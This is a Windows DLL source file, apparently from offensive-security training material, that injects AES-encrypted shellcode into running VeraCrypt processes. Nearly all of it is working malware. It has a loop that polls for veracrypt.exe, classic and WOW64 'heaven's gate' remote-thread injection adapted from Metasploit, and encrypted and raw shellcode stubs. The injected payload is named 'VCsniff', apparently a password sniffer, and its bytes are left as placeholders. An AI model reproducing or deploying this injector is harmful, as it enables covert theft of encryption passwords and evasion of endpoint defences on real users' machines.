// author: reenz0h(twitter : @SEKTOR7net)

#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// VCsniff Reflective AES encrypted shellcode
unsigned char payload[] = <PAYLOAD>;
unsigned char key[] = <KEY>;
unsigned int payload_len = sizeof(payload);
unsigned char key_len = sizeof(key);

// Definitions used for running native x64 code from a wow64 process
// (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h)
typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );

// The context used for injection via migrate_via_remotethread_wow64
typedef struct _WOW64CONTEXT {
        union   {
                HANDLE hProcess;
                BYTE bPadding2[8];
        } h;

        union   {
                LPVOID lpStartAddress;
                BYTE bPadding1[8];
        } s;

        union   {
                LPVOID lpParameter;
                BYTE bPadding2[8];
        } p;
        union   {
                HANDLE hThread;
                BYTE bPadding2[8];
        } t;
} WOW64CONTEXT, * LPWOW64CONTEXT;


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

// classic injection
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;


	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}


int InjectWOW64(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c

	LPVOID pRemoteCode = NULL;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;

/*
 A simple function to execute native x64 code from a wow64 (x86) process. 

 Can be called from C using the following prototype:
     typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
 The native x64 function you specify must be in the following form (as well as being x64 code):
     typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );

 Original binary:
     src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
	BYTE sh_executex64[] =  "\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
							"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
							"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
							"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
							"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

	src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
	BYTE sh_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
							"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
							"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
							"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
							"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
							"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
							"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
							"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
							"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
							"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
							"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
							"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
							"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
							"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
							"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
							"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
							"\x48\x83\xC4\x50\x48\x89\xFC\xC3";
*/

	// AES-encrypted sh_executex64 function (switches to 64-bit mode and runs sh_wownativex)
	unsigned char sh_executex64[] = { 0xf7, 0x69, 0x26, 0xaf, 0x10, 0x56, 0x2a, 0xcc, 0xeb, 0x96, 0x6b, 0xd0, 0xb8, 0xe3, 0x4d, 0x44, 0x16, 0xb0, 0xf8, 0x9d, 0x32, 0xd9, 0x65, 0x12, 0xa2, 0x9e, 0xec, 0x5d, 0x37, 0xde, 0x34, 0x9a, 0x94, 0x19, 0xc7, 0xa5, 0xe6, 0xe8, 0x3e, 0xa2, 0x1d, 0x5a, 0x77, 0x25, 0xcb, 0xc, 0xcd, 0xd0, 0x59, 0x11, 0x3c, 0x2d, 0x4d, 0x16, 0xf1, 0x95, 0x3a, 0x33, 0x0, 0xb4, 0x3, 0x55, 0x98, 0x6f, 0x61, 0x84, 0x61, 0x2b, 0x8a, 0xe8, 0x53, 0x47, 0xaa, 0x58, 0xfc, 0x70, 0x91, 0xcd, 0xa9, 0xb1 };
	unsigned int sh_executex64_len = sizeof(sh_executex64);
	unsigned char sh_executex64_key[] = { 0x26, 0x96, 0xcc, 0x43, 0xca, 0x1f, 0xf8, 0xa, 0xe5, 0xcc, 0xbf, 0xf1, 0x2f, 0xc9, 0xae, 0x71 };
	size_t sh_executex64_key_len = sizeof(sh_executex64_key);

	// AES-encrypted sh_wownativex function (calling RtlCreateUserThread in target process)
	unsigned char sh_wownativex[] = { 0x20, 0x8f, 0x32, 0x33, 0x59, 0xa1, 0xce, 0x2f, 0xf8, 0x8b, 0xa, 0xb4, 0x2a, 0x7f, 0xe6, 0x26, 0xe4, 0xd1, 0x4e, 0x25, 0x38, 0x57, 0xdd, 0xc4, 0x2c, 0x1c, 0x10, 0x2b, 0x70, 0x0, 0x9, 0x67, 0x5c, 0x70, 0x6d, 0x67, 0x4f, 0x27, 0xe8, 0xaf, 0xa1, 0x6f, 0x10, 0x42, 0x73, 0x9d, 0x4a, 0xb1, 0x6, 0x22, 0x89, 0xef, 0xac, 0x40, 0xd7, 0x93, 0x94, 0x6e, 0x4c, 0x6e, 0xf4, 0xcb, 0x46, 0x4d, 0xf3, 0xe8, 0xb5, 0x36, 0x11, 0xa6, 0xad, 0xeb, 0x8d, 0xda, 0xa0, 0x54, 0x75, 0xd9, 0xf3, 0x41, 0x34, 0xb3, 0xa6, 0x70, 0x41, 0x3e, 0xf3, 0x96, 0x97, 0x12, 0x74, 0x6b, 0x2e, 0x36, 0x31, 0x26, 0x86, 0x2, 0x24, 0x59, 0x40, 0xb9, 0xbb, 0x2b, 0xa2, 0x98, 0xbe, 0x15, 0x73, 0xb5, 0x90, 0x39, 0xe5, 0x82, 0xbb, 0xdd, 0x7, 0xe9, 0x9d, 0x89, 0x9a, 0x9e, 0x5f, 0x94, 0xde, 0x2, 0x80, 0x36, 0x45, 0x5d, 0x8e, 0xe6, 0x5e, 0x2c, 0x58, 0x59, 0xf4, 0xf7, 0xa0, 0xbf, 0x7e, 0x94, 0xff, 0x50, 0xf0, 0x76, 0x74, 0x2f, 0xd1, 0x91, 0x18, 0x65, 0x12, 0x30, 0xfa, 0x4, 0x61, 0xa5, 0x4d, 0x25, 0x57, 0xf4, 0x52, 0x99, 0xa2, 0x93, 0x67, 0xe1, 0x6, 0x43, 0x4b, 0x55, 0x53, 0x67, 0x89, 0x18, 0x71, 0x72, 0xdb, 0x82, 0xef, 0x5b, 0xdc, 0x8b, 0xb0, 0x91, 0xf5, 0x58, 0xe4, 0x85, 0xc3, 0x80, 0x7b, 0x79, 0x21, 0x3a, 0x60, 0x99, 0xc5, 0x62, 0x2c, 0x73, 0xa4, 0x2b, 0xe2, 0xc, 0xda, 0xa2, 0x88, 0x6b, 0x2f, 0x38, 0x80, 0xfd, 0xb1, 0xaf, 0xea, 0x4f, 0xb5, 0x0, 0xda, 0x46, 0x46, 0x9d, 0x23, 0xdd, 0xe3, 0x4a, 0xf5, 0xc9, 0x8, 0xf0, 0x97, 0xa9, 0x55, 0x71, 0xda, 0x84, 0xa9, 0xf5, 0xcb, 0x1f, 0xb9, 0xb9, 0x67, 0xf7, 0xf2, 0x2f, 0x2a, 0x56, 0x3, 0xe1, 0x56, 0x26, 0xb4, 0x3a, 0xd9, 0xe2, 0x11, 0x8a, 0x8f, 0xef, 0x8c, 0x89, 0xc0, 0x26, 0x9c, 0x9f, 0xe5, 0x18, 0xd4, 0xd7, 0xae, 0x91, 0xbf, 0x2b, 0x14, 0xbb, 0xfd, 0xe0, 0xb5, 0x9c, 0x9d, 0x81, 0x71, 0x5d, 0xdd, 0xe6, 0x5d, 0x8a, 0xe6, 0x61, 0xf2, 0x69, 0xf8, 0x95, 0x4f, 0xcd, 0xe3, 0x52, 0x1f, 0x14, 0xe5, 0x8c };
	unsigned int sh_wownativex_len = sizeof(sh_wownativex);
	unsigned char sh_wownativex_key[] = { 0xe5, 0x53, 0xc4, 0x11, 0x75, 0x14, 0x86, 0x8f, 0x59, 0x35, 0x7c, 0xc7, 0x8b, 0xc5, 0xdc, 0x2d };
	size_t sh_wownativex_key_len = sizeof(sh_wownativex_key);

	// inject payload into target process
	AESDecrypt((char *) payload, payload_len, (char *) key, key_len);
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	//printf("remcode = %p\n", pRemoteCode); getchar();
	
	// alloc a RW buffer in this process for the EXECUTEX64 function
	pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(sh_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
	// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
	pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	//printf("pExecuteX64 = %p ; pX64function = %p\n", pExecuteX64, pX64function); getchar();

	// decrypt and copy over the wow64->x64 stub
	AESDecrypt((char *) sh_executex64, sh_executex64_len, (char *) sh_executex64_key, sh_executex64_key_len);
	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
	VirtualAlloc( pExecuteX64, sizeof(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );

	// decrypt and copy over the native x64 function
	AESDecrypt((char *) sh_wownativex, sh_wownativex_len, (char *) sh_wownativex_key, sh_wownativex_key_len);
	memcpy( pX64function, sh_wownativex, sh_wownativex_len );

	// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
	VirtualAlloc( pX64function, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// set the context
	ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + sh_wownativex_len );

	ctx->h.hProcess       = hProc;
	ctx->s.lpStartAddress = pRemoteCode;
	ctx->p.lpParameter    = 0;
	ctx->t.hThread        = NULL;

	//printf("hit me...\n"); getchar();
	
	// run a new thread in target process
	pExecuteX64( pX64function, (DWORD)ctx );
	
	if( ctx->t.hThread ) {
		// if success, resume the thread -> execute payload
		//printf("Thread should be there, frozen...\n"); getchar();
		ResumeThread(ctx->t.hThread);

		// cleanup in target process
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);

		return 0;
	}
	else
		return 1;
}

extern "C" __declspec(dllexport) int Go(void) {
//int main(void) {
	int pid = 0;
    HANDLE hProc = NULL;

	while (1) {
		pid = FindTarget("veracrypt.exe");
	
		if (pid) {
			//printf("PID = %d\n", pid);
	
			// try to open target process
			hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
							PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
							FALSE, (DWORD) pid);
	
			if (hProc != NULL) {
				InjectWOW64(hProc, payload, payload_len);
				CloseHandle(hProc);
				break;
			}
		}
		Sleep(5000);
		pid = 0;
		
	}
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			break;
	}
	
    return TRUE;
}